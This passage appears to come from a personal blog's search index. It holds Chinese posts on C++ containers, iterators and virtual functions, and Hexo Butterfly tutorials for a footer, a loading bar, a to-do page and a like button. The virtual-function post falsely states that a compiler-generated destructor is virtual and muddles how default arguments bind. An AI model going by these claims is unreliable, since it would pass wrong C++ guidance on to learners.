queue 先进先出 priority_queue 最高优先级元素总是第一个出列，优先级队列默认使用vector作为其底层存储数据的容器，在vector上又使用了堆算法将vector中元素构造成堆的结构，因此priority_queue就是堆 标准库共有函数 默认构造函数 提供容器默认初始化的构造函数。 复制构造函数 将容器初始化为现有同类容器副本的构造函数 析构函数 不再需要容器时进行内存整理的析构函数 empty 容器中没有元素时返回true,否则返回false max_size 返回容器中最大元素个数 size 返回容器中当前元素个数 = 将一个容器赋给另一个容器 &lt; 如果第一个容器小于第二个容器，返回true，否则返回false， &lt;= 如果第一个容器小于或等于第二个容器，返回true，否则返回false &gt; 如果第一个容器大于第二个容器，返回true，否则返回false &gt;= 如果第一个容器大于或等于第二个容器，返回true，否则返回false == 如果第一个容器等于第二个容器，返回true，否则返回false != 如果第一个容器不等于第二个容器，返回true，否则返回false swap 交换两个容器的元素 其中&gt;，&gt;=，&lt;，&lt;=，==，!=均不适用于priority_queue 顺序容器和关联容器共有函数 函数 说明 begin 该函数两个版本返回iterator或const_iterator，引用容器第一个元素 end 该函数两个版本返回iterator或const_iterator,引用容器最后一个元素后面一位 rbegin 该函数两个版本返回reverse_iterator或const_reverse_iterator，引用容器最后一个元素 rend 该函数两个版本返回reverse_iterator或const_reverse_iterator，引用容器第一个元素前面一位 erase 从容器中清除一个或几个元素 clear 清除容器中所有元素 序列类容器使用区别 1）如果你需要高效的随存随取，而不在乎插入和删除的效率，使用vector 2）如果你需要大量的插入和删除，而不关心随机存取，则应使用list 3）如果你需要随机存取，而且关心两端数据的插入和删除，则应使用deque","tags":"c++容器"},{"title":"C++迭代器基础用法","url":"/post/6e85eca8.html","text":"前言参考自：C++迭代器（STL迭代器）iterator详解 (biancheng.net) 迭代器种类 正向迭代器 1容器类名::iterator 迭代器名; 常量正向迭代器 1容器类名::const_iterator 迭代器名; 反向迭代器 1容器类名::reverse_iterator 迭代器名; 常量反向迭代器 1容器类名::const_reverse_iterator 迭代器名; 迭代器使用迭代器类似于指针，可以指向容器中的不同元素并进行修改(常量迭代器无法修改)，*迭代器就代表元素本身 实例1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; vector&lt;string&gt; flowers = &#123;&quot;LJY&quot;, &quot;WY&quot;, &quot;WZ&quot;, &quot;DQY&quot;&#125;; // 定义正向迭代器 cout &lt;&lt; &quot;正向迭代器: &quot; &lt;&lt; endl; cout &lt;&lt; &quot;修改前: &quot; &lt;&lt; endl; for (vector&lt;string&gt;::iterator iter = flowers.begin(); iter != flowers.end(); ++iter) // 使用前置++效率更高 &#123; cout &lt;&lt; *iter &lt;&lt; endl; transform((*iter).begin(), (*iter).end(), (*iter).begin(), tolower); // 利用迭代器修改元素 &#125; cout &lt;&lt; &quot;修改后: &quot; &lt;&lt; endl; for (vector&lt;string&gt;::iterator iter = flowers.begin(); iter != flowers.end(); ++iter) // 使用前置++效率更高 &#123; cout &lt;&lt; *iter &lt;&lt; endl; &#125; // 定义反向迭代器 cout &lt;&lt; &quot;\\n反向迭代器: &quot; &lt;&lt; endl; for (vector&lt;string&gt;::reverse_iterator iter = flowers.rbegin(); iter != flowers.rend(); iter++) &#123; cout &lt;&lt; *iter &lt;&lt; endl; &#125; return 0;&#125; 功能分类1) 正向迭代器，支持以下操作：++p，p++，*p。此外，两个正向迭代器可以互相赋值，还可以用==和!=运算符进行比较。 2) 双向迭代器，具有正向迭代器的全部功能。除此之外，若 p 是一个双向迭代器，则--p和p--都是使得 p 朝和++p相反的方向移动。 3) 随机访问迭代器。具有双向迭代器的全部功能。若 p 是一个随机访问迭代器，i 是一个整型变量或常量，则 p 还支持以下操作： p+=i：使得 p 往后移动 i 个元素。 p-=i：使得 p 往前移动 i 个元素。 p+i：返回 p 后面第 i 个元素的迭代器。 p-i：返回 p 前面第 i 个元素的迭代器。 p[i]：返回 p 后面第 i 个元素的引用。 此外，两个随机访问迭代器 p1、p2 还可以用 &lt;、&gt;、&lt;=、&gt;= 运算符进行比较。p1&lt;p2的含义是：p1 经过若干次（至少一次）++操作后，就会等于 p2。其他比较方式的含义与此类似 对于两个随机访问迭代器 p1、p2，表达式p2-p1也是有定义的，其返回值是 p2 所指向元素和 p1 所指向元素的序号之差（也可以说是 p2 和 p1 之间的元素个数加一） 不同容器的迭代器的功能 容器或容器适配器 迭代器功能 vector 随机访问 deque 随机访问 list 双向 set / multiset 双向 map / multimap 双向 stack 不支持迭代器 queue 不支持迭代器 priority_queue 不支持迭代器","tags":"c++迭代器"},{"title":"公告栏3D小人","url":"/post/850eec50.html","text":"效果预览 在 Blog/themes/Butterfly/layout/includes/widget/card_announcement.pug 下添加如下代码： 1234567891011121314151617 .xpand(style=&#x27;height:200px;&#x27;) canvas.illo(width=&#x27;800&#x27; height=&#x27;800&#x27; style=&#x27;max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;&#x27;)script(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js&#x27;)script(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js&#x27;)script#rendered-js(src=&#x27;https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js&#x27;)style. .card-widget.card-announcement &#123; margin: 0; align-items: center; justify-content: center; text-align: center; &#125; canvas &#123; display: block; margin: 0 auto; cursor: move; &#125; 缩进参考：","tags":"博客美化"},{"title":"虚函数实例分析","url":"/post/f61f36df.html","text":"前言今天c++实验让我们分析下列程序的输出 代码与运行结果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;complex&gt;using namespace std;class Base&#123;public: Base() &#123; cout &lt;&lt; &quot;Base-ctor&quot; &lt;&lt; endl; &#125; ~Base() &#123; cout &lt;&lt; &quot;Base-dtor&quot; &lt;&lt; endl; &#125; virtual void f(int) &#123; cout &lt;&lt; &quot;Base::f(int)&quot; &lt;&lt; endl; &#125; virtual void f(double) &#123; cout &lt;&lt; &quot;Base::f(double)&quot; &lt;&lt; endl; &#125; virtual void g(int i = 10) &#123; cout &lt;&lt; &quot;Base::g()&quot; &lt;&lt; i &lt;&lt; endl; &#125;&#125;;class Derived : public Base&#123;public: Derived() &#123; cout &lt;&lt; &quot;Derived-ctor&quot; &lt;&lt; endl; &#125; ~Derived() &#123; cout &lt;&lt; &quot;Derived-dtor&quot; &lt;&lt; endl; &#125; void f(complex&lt;double&gt;) &#123; cout &lt;&lt; &quot;Derived::f(complex)&quot; &lt;&lt; endl; &#125; void g(int i = 20) &#123; cout &lt;&lt; &quot;Derived::g()&quot; &lt;&lt; i &lt;&lt; endl; &#125;&#125;;int main()&#123; cout &lt;&lt; sizeof(Base) &lt;&lt; endl; cout &lt;&lt; sizeof(Derived) &lt;&lt; endl; Base b; // Base-ctor Derived d; // Base-ctor Derived-ctor Base *pb = new Derived; // Base-ctor Derived-ctor 就是构造一个派生类，先调用基类构造函数再调用派生类构造函数 b.f(1.0); // Base::f(double) d.f(1.0); // Derived::f(complex) pb-&gt;f(1.0); // Base::f(double) 1.0-&gt;double，派生类中没有(double比complex优先匹配)，直接调用基类的double b.g(); // Base::g()10 d.g(); // Derived::g()20 pb-&gt;g(); // Derived::g()10 delete pb; // Base-dtor !!!删除只看指针类型进行析构！！！ // Derived-dtor // Base-dtor // Base-dtor return 0;&#125; 分析内存大小我也不是很清楚是如何计算的，但是后续输出大概搞懂了 定义基类对象b：调用基类构造函数 定义派生类对象d：先调用基类构造函数，再调用派生类构造函数 定义基类指针指向派生类对象：实际上就是创建了一个派生类对象，同样是先调用基类构造函数，再调用派生类构造函数 b.f(1.0)：调用基类的f(double) d.f(1.0)：优先匹配派生类对象的函数，符合complex类型(复数类，如果只输入一个值，默认作为实部)，调用派生类的f(complex) pb-&gt;f(1.0)：pb为基类指针，f为虚函数但是1.0优先匹配double-&gt;调用基类的f(double)，如果删除基类的f(double)就会调用派生类的f(complex) b.g()：调用基类的g(int)，未指定值默认输出10 d.g()：调用派生类的g(int)，未指定值默认输出20 pb-&gt;g()：这个我只是勉强可以理解，但是具体原理我也不太明白，pb为基类指针，g()为虚函数，如果派生类的该同名函数与基类的该函数在参数(个数与数据类型)上完全一致的话，程序会选择执行派生类的该函数并将基类的该函数的形参值赋给派生类的相应形参；如果派生类的该同名函数与基类的该函数在参数(个数与数据类型)上并非完全一致，则直接执行基类的该函数 delete pb：这个很容易判断出错，注意看这个程序对基类析构函数的定义：不是虚析构函数！！！因此虽然定义了一个派生类指针但是却只会执行基类析构函数 如果是使用系统默认析构函数的话，会一并析构基类与派生类，因为系统定义的析构函数是虚析构函数，因此可以执行到派生类的析构函数，所以我们如果自己要定义析构函数，推荐都定义为虚析构函数，即virtual ~Base() &#123;&#125;","tags":"c++语法"},{"title":"博客自定义页脚","url":"/post/a4906bff.html","text":"前言转载自：唐志远の博客 效果预览 ps：升级版页脚请移步：页脚美化 升级版效果预览 步骤 直接将BlogRoot/themes/butterfly/layout/includes/footer.pug中的所有代码替换为如下代码并自行修改内容: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#footer-wrap #ft .ft-item-1 .t-top .t-t-l p.ft-t.t-l-t Welcome .bg-ad div | --- DQY ❤ WY --- .btn-xz-box a.btn-xz(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于站长 .t-t-r p.ft-t.t-l-t 博客导航 ul.ft-links li a(href=&#x27;https://www.dqywy.top/categories/博客/&#x27;) 建站指南 a(href=&#x27;https://www.dqywy.top/ToDoList/&#x27;) 待做清单 li a(href=&#x27;https://www.dqywy.top/categories/&#x27;) 文章分类 a(href=&#x27;https://www.dqywy.top/tags/&#x27;) 文章标签 li a(href=&#x27;https://www.dqywy.top/archives/&#x27;) 时间轴 a(href=&#x27;https://www.dqywy.top/about/&#x27;) 关于博主 .ft-item-2 p.ft-t 推荐友链 .ft-img-group .img-group-item a(href=&#x27;http://47.109.96.67:4000/&#x27;) img(src=&#x27;https://s1.ax1x.com/2023/05/07/p9wAPit.jpg&#x27; alt=&#x27;狗墙&#x27;) if theme.footer.owner.enable - var now = new Date() - var nowYear = now.getFullYear() if theme.footer.owner.since &amp;&amp; theme.footer.owner.since != nowYear .copyright!= `&amp;copy;$&#123;theme.footer.owner.since&#125; - $&#123;nowYear + &#x27; &#x27;&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; $&#123;config.author&#125;` else .copyright!= `&amp;copy;$&#123;nowYear + &#x27; &#x27;&#125; &lt;i id=&quot;heartbeat&quot; class=&quot;fa fas fa-heartbeat&quot;&gt;&lt;/i&gt; $&#123;config.author&#125;` if theme.footer.copyright .framework-info span= _p(&#x27;footer.framework&#x27;) + &#x27; &#x27; a(href=&#x27;https://hexo.io&#x27;)= &#x27;Hexo&#x27; span.footer-separator | span= _p(&#x27;footer.theme&#x27;) + &#x27; &#x27; a(href=&#x27;https://github.com/jerryc127/hexo-theme-butterfly&#x27;)= &#x27;Butterfly&#x27; if theme.footer.custom_text .footer_custom_text!=`$&#123;theme.footer.custom_text&#125;` 打开Blog\\source\\css\\custom.css，缺少的文件夹或文件直接创建即可，添加下列代码 ps：下列代码的第7行，注释掉-&gt;白天模式文字为黑色，黑夜模式文字为白色；不注释掉-&gt;白天黑夜均为你自定义的颜色 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156/* 自定义底部 start */#ft &#123; max-width: 1200px; margin: 0 auto 12px; display: flex; /*color: rgb(255 255 255 / 80%) !important;*/ text-align: left; flex-wrap: wrap;&#125;.ft-item-1,.ft-item-2 &#123; display: flex; height: 100%; padding: 10px 14px;&#125;.ft-item-1 &#123; flex-direction: column; flex: 2;&#125;.ft-item-2 &#123; flex: 1; flex-direction: column;&#125;.t-top &#123; display: flex;&#125;.t-top .t-t-l &#123; display: flex; flex-direction: column; flex: 1.4; margin-right: 10px;&#125;.t-top .t-t-l .bg-ad &#123; width: 85%; border-radius: 10px; padding: 0 10px;&#125;.btn-xz-box &#123; margin-top: 10px;&#125;.btn-xz &#123; display: block; background-color: var(--btn-bg); color: var(--btn-color); text-align: center; line-height: 2.4; margin: 8px 0; cursor: pointer !important;&#125;.btn-xz:hover &#123; text-decoration: none !important;&#125;.btn-xz-box:hover .btn-xz &#123; background-color: #6f42c1;&#125;.t-top .t-t-r &#123; display: flex; flex-direction: column; flex: 1;&#125;.ft-links &#123; padding: 0 14px; list-style: none; margin-top: 0 !important;&#125;.ft-links li a &#123; display: inline-block !important; width: 50%; cursor: pointer !important;&#125;.ft-links li a:hover &#123; text-decoration: none !important; color: #6f42c1 !important;&#125;.ft-item-2 .ft-img-group &#123; width: 100%;&#125;.ft-t &#123; font-size: 0.8rem; margin-bottom: 20px; line-height: 1; font-weight: 600;&#125;.t-l-t &#123; padding-left: 14px;&#125;.ft-item-2 .ft-img-group .img-group-item &#123; display: inline-block; width: 18.4%; margin-right: 14px; margin-bottom: 6px;&#125;.ft-item-2 .ft-img-group .img-group-item a &#123; display: inline-block; width: 100%; height: 100%; cursor: pointer !important;&#125;.ft-item-2 .ft-img-group .img-group-item a img &#123; width: 100%; max-height: 80px;&#125;@media screen and (max-width: 768px) &#123; .ft-item-1 &#123; flex-basis: 100% !important; &#125; .ft-item-2 &#123; flex-basis: 100% !important; &#125; .t-top .t-t-l .bg-ad &#123; width: 100%; &#125;&#125;@media screen and (max-width: 576px) &#123; .t-top &#123; flex-wrap: wrap; &#125; .t-top .t-t-l &#123; flex-basis: 100% !important; &#125; .t-top .t-t-r &#123; margin-top: 16px; flex-basis: 100% !important; &#125;&#125;/* 自定义底部 End */ 将上述代码中的#6f42c1换成你的主题色，引入custom.css: 打开主题配置文件_config.butterfly.yml搜索inject找到head头部： 1- &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; hexo三连查看效果即可","tags":"博客美化"},{"title":"添加白天黑夜模式转换动画","url":"/post/aa5bf2dc.html","text":"前言参考自：添加白天夜间模式转换动画 实现过程参考教程非常详细，只是提一点可能需要注意的地方：+表示新增内容，-表示需要删除的内容，+在添加代码后不要忘记删掉并且删除后代码缩进需要保持不变","tags":"博客美化"},{"title":"添加顶部加载进度条","url":"/post/277d5d10.html","text":"前言参考自：为你的Butterfly添加顶部加载进度条 效果预览 查看butterfly版本 4.5.0及以上版本主题已内置 pace.js 无需再次引入，打开主题配置文件_config.butterfly.yml搜索preloader并按下列格式修改，修改完直接hexo三连即可 12345678preloader: enable: true # source # 1. fullpage-loading # 2. pace (progress bar) source: 2 # pace theme (see https://codebyzach.github.io/pace/) pace_css_url: https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css 4.5.0版本以下需要引入css 新建Blog\\source\\css\\custom.css，缺少的文件夹或文件直接创建即可，添加下列代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748.pace &#123; pointer-events: none; user-select: none; z-index: 2; position: fixed; margin: auto; top: 4px; left: 0; right: 0; height: 8px; border-radius: 8px; width: 6rem; background: #eaecf2; overflow: hidden;&#125;.pace-inactive .pace-progress &#123; opacity: 0; transition: 0.3s ease-in;&#125;.pace.pace-inactive &#123; opacity: 0; transition: 0.3s; top: -8px;&#125;.pace .pace-progress &#123; box-sizing: border-box; transform: translate3d(0, 0, 0); position: fixed; z-index: 2; display: block; position: absolute; top: 0; right: 100%; height: 100%; width: 100%; background: #49b1f5; background: linear-gradient( to right, rgb(18, 194, 233), rgb(196, 113, 237), rgb(246, 79, 89) ); animation: gradient 2s ease infinite; background-size: 200%;&#125; 引入CSS与JS 12- &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;- &lt;script src=&quot;//cdn.bootcss.com/pace/1.0.2/pace.min.js&quot;&gt;&lt;/script&gt; hexo三连查看效果即可","tags":"博客美化"},{"title":"制作待做清单页面","url":"/post/c9b8a393.html","text":"前言转载自：博客添加待办清单页 | 轻笑Chuckle (qcqx.cn) 效果预览 实现过程新建Blog\\themes\\butterfly\\layout\\includes\\page\\todolist.pug并添加下列代码 注意：请将下列代码第二行中的/img/todo.webp替换为你想要展现的图片路径 123456789101112131415161718192021222324252627282930313233#todolist-box .page-top-card(style=&#x27;background-image: url(/img/todo.png);&#x27;) .content-item-tips 想做清单 span.content-item-title ToDoList .content-bottom .tips 要做的事还有很多，想做的事源源不断 #todolist-main #todolist-left each i in site.data.todolist if i.seat == &#x27;left&#x27; .todolist-item h3.todolist-title=i.class_name ul.todolist-ul each item in i.todo_list li.todolist-li if item.completed i.fa-regular.fa-circle-check else i.fa-regular.fa-circle span=item.content #todolist-right each i in site.data.todolist if i.seat == &#x27;right&#x27; .todolist-item h3.todolist-title=i.class_name ul.todolist-ul each item in i.todo_list li.todolist-li if item.completed i.fa-regular.fa-circle-check else i.fa-regular.fa-circle span=item.content 修改Blog\\themes\\butterfly\\layout\\page.pug，将下列代码添加到如图所示的位置，注意缩进 12when &#x27;todolist&#x27; include includes/page/todolist.pug 新建Blog\\source \\ _data\\todolist.yml，清单内容请自行修改，completed为true代表已完成 123456789101112131415161718192021222324252627282930313233343536373839- class_name: 想做的项目 seat: left todo_list: - content: 个人主页 completed: false - content: 公众号 completed: false- class_name: 想看的书 seat: left todo_list: - content: 《毛泽东选集》 completed: false - content: 《86不存在的战区》 completed: false- class_name: 想买的东西 seat: left todo_list: - content: 小米平板5pro completed: true - content: 致态固态硬盘 completed: true- class_name: 想学的技术 seat: right todo_list: - content: Vue2/Vue3 completed: false - content: Electron completed: false- class_name: 想去的地方 seat: right todo_list: - content: 桂林 completed: true - content: 杭州 completed: false 打开Blog\\source\\css\\custom.css并在末尾添加下列代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#todolist-box&#123; margin: 0 10px;&#125;#todolist-main&#123; display: flex; flex-direction: row; flex-wrap: wrap; justify-content: center; margin: 16px 0 10px;&#125;#todolist-main li&#123; list-style:none; font-size: 17px;&#125;#todolist-main ul&#123; margin: 0; padding: 0;&#125;#todolist-left&#123; width: 50%; padding: 0 8px 0 0;&#125;#todolist-right&#123; width: 50%; padding: 0 0 0 8px;&#125;.todolist-item&#123; position: relative; background: #fae4df; border-radius: 12px; padding: 10px 1rem 1.2rem; border: 2px dashed #f7a796; margin-bottom: 1rem;&#125;[data-theme=dark].todolist-item&#123; background: #242424; border: 2px dashed #51908b;&#125;li.todolist-li i&#123; margin-left: 10px;&#125;h3.todolist-title&#123; margin: 0!important; border-bottom: var(--todo-border);&#125;li.todolist-li&#123; border-bottom: var(--todo-border); font-weight: normal;&#125;.todolist-li span&#123; margin-left: 5px;&#125;@media screen and (max-width:700px)&#123; #todolist-left,#todolist-right&#123; width: 100%; padding: 0; &#125; &#125;.page-top-card&#123; background-size: cover; background-position: center; height: 20.5rem; padding: 10px 2.7rem; border-radius: 20px; color: white; position: relative;&#125;.page-top-card span.content-item-title&#123; font-size: 2.3em; font-weight: bold; line-height: 1.2; font-family: STZhongsong,&#x27;Microsoft YaHei&#x27;;&#125;.page-top-card .content-bottom&#123; display: flex; justify-content: space-between; align-items: center; position: absolute; width: calc(100% - 5.4rem); bottom: 1rem;&#125;[data-theme=&#x27;dark&#x27;] .page-top-card&#123; opacity: .92;&#125; 新建页面：在Blog根目录打开Git Bash，输入下列代码 1hexo new page &quot;ToDoList&quot; 修改front-matter 添加到导航菜单 打开主题配置文件_config.butterfly.yml，图标我用的是标签的图标，因为我的标签页没有启用，你可以更换成自己想要的 hexo三连1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s","tags":"博客搭建"},{"title":"实现文章点赞","url":"/post/8b08ba9.html","text":"前言转载自：网站添加点赞、踩功能 | 轻笑Chuckle (qcqx.cn) 效果预览 部署OrLike注册登录LeanCloud并创建应用-&gt;回到首页点击应用设置 点击应用凭证并保存AppID和AppKey的值 点击数据存储-&gt;结构化数据-&gt;创建Class，名称设置为OrLike，不用改其余配置 点击一键部署)，将应用部署到Vercel，未注册Vercel请参考添加Twikoo实现博客在线评论由于Vercel域名被墙，需要修改Vercel域名，请参考添加Twikoo实现博客在线评论添加环境变量今天完全搞忘了这一步导致云函数一直报错500，蠢哭了~_~ 打开刚刚部署的项目点击settings 点击Environment Variables并填入Key和Value，这里注意：Key填”APPID”和”APPKEY” 前端部署以butterfly主题框架为例： 修改themes\\butterfly\\layout\\includes\\post\\reward.pug，在末尾添加以下代码 123456789101112#orlike-box.orlike-box script. (() =&gt; &#123; function loadOrLike () &#123; new OrLike(&#123; serverUrl: &quot;你的api&quot;, el: &quot;.orlike-box&quot;, days: 30, &#125;); &#125; window.pjax ? loadOrLike() : window.addEventListener(&#x27;load&#x27;, loadOrLike) &#125;)() 修改themes\\butterfly\\layout\\includes\\header\\post-info.pug，在末尾添加以下代码，注意缩进在.meta-firstline内，与上方if保持一致即可 12345span.post-meta-orlike i.iconfont.icon-aixin.fa-fw.post-meta-icon span.post-meta-label= &#x27;点赞数:&#x27; a(href=url_for(page.path) + &#x27;#orlike-box&#x27;) span.orlike-count 新建Blog\\source\\js\\orlike.js，路径中缺少的文件夹或文件直接创建即可，添加下列代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const version = &quot;V0.1.33&quot;; function setCookie(cname, cvalue, exdays) &#123; var d = new Date(); d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000)); var expires = &quot;expires=&quot; + d.toGMTString(); document.cookie = cname + &quot;=&quot; + cvalue + &quot;; &quot; + expires; &#125;function getCookie(cname) &#123; var name = cname + &quot;=&quot;; var ca = document.cookie.split(&#x27;;&#x27;); for (var i = 0; i &lt; ca.length; i++) &#123; var c = ca[i].trim(); if (c.indexOf(name) == 0) &#123; return c.substring(name.length, c.length); &#125; &#125; return &quot;&quot;;&#125;function createLink(url) &#123; let link = $(document.createElement(&#x27;link&#x27;)); link.attr(&#x27;href&#x27;, url); link.attr(&#x27;rel&#x27;, &#x27;stylesheet&#x27;); link.attr(&#x27;type&#x27;, &#x27;text/css&#x27;); $(&#x27;link&#x27;).last().after(link); &#125;function OrLike(&#123; serverUrl = &quot;&quot;, el = &quot;&quot;, days = 30, style = &quot;&quot;, ifont = &quot;&quot;, icon = &#123; like: &quot;fa fa-thumbs-up&quot;, dislike: &quot;fa fa-thumbs-down&quot; &#125;, &#125; = &#123;&#125;) &#123; this.serverUrl = serverUrl; this.el = el; this.style = style; this.ifont = ifont; this.days = days; this.icon = icon; this.ckid = &quot;&quot;; this.prepare(); this.init(); &#125;OrLike.prototype.prepare = function () &#123; $(this.el).addClass(&quot;orlike-loading&quot;); if (this.style != &quot;&quot;) &#123; createLink(this.style); &#125; if (this.ifont != &quot;&quot;) &#123; createLink(this.ifont); &#125;&#125;OrLike.prototype.init = function () &#123; server_url = this.serverUrl; obj = this; $.ajax(&#123; type: &#x27;GET&#x27;, url: server_url + &#x27;/tmp&#x27;, dataType: &#x27;jsonp&#x27;, jsonp: &quot;callback&quot;, jsonpCallback: &quot;success&quot;, xhrFields: &#123; withCredentials: true &#125;, async: true, crossDomain: true, success: function (data) &#123; let template = $(data.template); let icon_like = template.siblings(&quot;a.likeit.orlike&quot;).children(&quot;i&quot;); let icon_dislike = template.siblings(&quot;a.dislikeit.orlike&quot;).children(&quot;i&quot;); icon_like.attr(&#x27;class&#x27;, obj.icon.like); icon_dislike.attr(&#x27;class&#x27;, obj.icon.dislike); if (obj.icon.like == false) icon_like.remove(); if (obj.icon.dislike == false) icon_dislike.remove(); $(obj.el).removeClass(&quot;orlike-loading&quot;); $(obj.el).html(template); obj.ckusr(obj); $(&#x27;a.likeit.orlike&#x27;).click(&#123; obj: obj &#125;, obj.like); $(&#x27;a.dislikeit.orlike&#x27;).click(&#123; obj: obj &#125;, obj.dislike); &#125;, &#125;);&#125;OrLike.prototype.ckusr = function (obj) &#123; server_url = this.serverUrl; $.ajax(&#123; type: &#x27;GET&#x27;, url: server_url + &#x27;/ckusr&#x27;, dataType: &#x27;jsonp&#x27;, jsonp: &quot;callback&quot;, jsonpCallback: &quot;success&quot;, xhrFields: &#123; withCredentials: true &#125;, async: false, crossDomain: true, success: function (data) &#123; if (data.stat == &#x27;ok&#x27; &amp;&amp; data.uid != &quot;&quot;) &#123; obj.ckid = data.ckid; if (!getCookie(data.ckid)) &#123; setCookie(data.ckid, data.uid, obj.days); &#125; obj.query(); &#125; else &#123; console.error(&#x27;connect orlike failed!!!&#x27;); &#125; &#125;, &#125;);&#125;OrLike.prototype.query = function () &#123; server_url = this.serverUrl; $.ajax(&#123; type: &#x27;GET&#x27;, url: server_url + &#x27;/qry?link=&#x27; + window.location.pathname, dataType: &#x27;jsonp&#x27;, jsonp: &quot;callback&quot;, jsonpCallback: &quot;success&quot;, xhrFields: &#123; withCredentials: true &#125;, crossDomain: true, success: function (data) &#123; if (data.stat == &#x27;ok&#x27;) &#123; $(&#x27;a.likeit.orlike i span&#x27;).text(data[&#x27;like&#x27;]); $(&#x27;span.post-meta-orlike a span&#x27;).text(data[&#x27;like&#x27;]); $(&#x27;a.dislikeit.orlike i span&#x27;).text(data[&#x27;dislike&#x27;]); &#125; else &#123; console.error(&#x27;query orlike failed!!!&#x27;); &#125; &#125;, &#125;);&#125;OrLike.prototype.orl = function (obj, method) &#123; server_url = obj.serverUrl; req_url = server_url + &#x27;/orl?method=&#x27; + method + &#x27;&amp;link=&#x27; + window.location.pathname + &#x27;&amp;&#x27; + obj.ckid + &#x27;=&#x27; + getCookie(obj.ckid); $.ajax(&#123; type: &#x27;GET&#x27;, url: req_url, dataType: &#x27;jsonp&#x27;, jsonp: &quot;callback&quot;, jsonpCallback: &quot;success&quot;, xhrFields: &#123; withCredentials: true &#125;, crossDomain: true, success: function (data) &#123; obj.query(); &#125;, &#125;); &#125;OrLike.prototype.like = function (event) &#123; obj = event.data.obj; obj.orl(obj, &#x27;like&#x27;); &#125;OrLike.prototype.dislike = function (event) &#123; obj = event.data.obj; obj.orl(obj, &#x27;dislike&#x27;); &#125; 打开主题配置文件_config.butterfly.yml，搜索inject引入orlike.js和JQ 12345inject: head: bottom: - &lt;script defer=&quot;true&quot; src=&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt; - &lt;script defer=&quot;true&quot; src=&quot;/js/orlike.js&quot;&gt;&lt;/script&gt; 打开Blog\\source\\css\\custom.css，缺少的文件夹或文件直接创建即可，在末尾写入下列代码并在主题配置文件_config.butterfly.yml引入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667.orlike &#123; color: rgba(255, 255, 255); font-size: 26px!important; line-height: 2; text-shadow: 5px 5px 5px #2ed0d9fc;&#125;[data-theme=dark].orlike &#123; color: rgba(255, 255, 255, 0.85); text-shadow: 4px 4px 4px #23a8af99;&#125;.orlike:first-child&#123; margin-right: 36px;&#125;.orlike span &#123; margin-left: 0.3rem;&#125;.orlike-box&#123; margin: 15px 0 0 0; display: flex; width: 100%; flex-direction: row; flex-wrap: nowrap; justify-content: center; position: relative; overflow: hidden; height: 52px;&#125;.orlike:hover&#123; color: #f07e7e!important;&#125;[data-theme=dark].orlike:hover&#123; color: #e87373e8!important;&#125;.orlike-loading &#123; display: block; height: 39px; width: 10px!important; border-radius: 50%; border: 2px solid #acacac; border-bottom-color: transparent; -webkit-animation: orlike-loadingRotate 0.75s linear infinite; animation: orlike-loadingRotate 0.75s linear infinite;&#125;@-webkit-keyframes orlike-loadingRotate &#123; 0% &#123; -webkit-transform: rotate(0deg); &#125; 50% &#123; -webkit-transform: rotate(180deg); &#125; 100% &#123; -webkit-transform: rotate(360deg); &#125;&#125;@keyframes orlike-loadingRotate &#123; 0% &#123; transform: rotate(0deg); &#125; 50% &#123; transform: rotate(180deg); &#125; 100% &#123; transform: rotate(360deg); &#125;&#125; 1234inject: head: # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt; - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot; media=&quot;defer&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt; hexo三连1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s","tags":"博客插件"},{"title":"for循环的新型遍历","url":"/post/c87cbb52.html","text":"c++遍历容器一般是这样的123std::vector&lt;std::string&gt; name = &#123;&quot;ljy&quot;, &quot;wy&quot;, &quot;wz&quot;, &quot;dqy&quot;&#125;;for (auto i = name.begin(); i != name.end(); i++) // 这里auto替换了std::vector&lt;std::string&gt;::iterator std::cout &lt;&lt; *i &lt;&lt; std::endl; 在c++11中我们可以简化成这样123std::vector&lt;std::string&gt; name = &#123;&quot;ljy&quot;, &quot;wy&quot;, &quot;wz&quot;, &quot;dqy&quot;&#125;;for (auto i : name) // 注意，这里auto替换的是std::string，即直接将容器中的每个元素赋给了i进行遍历 std::cout &lt;&lt; i &lt;&lt; std::endl; 不懂auto用法的小伙伴可以参考：auto用法 另外，也可以使用std::for_each实现相同功能，注意要添加头文件123456789101112// 自定义操作，挨个传入容器元素void output(std::string s)&#123; std::cout &lt;&lt; s &lt;&lt; std::endl;&#125;int main()&#123; std::vector&lt;std::string&gt; name = &#123; &quot;ljy&quot;, &quot;wy&quot;, &quot;wz&quot;, &quot;dqy&quot; &#125;; std::for_each(name.begin(), name.end(), output); 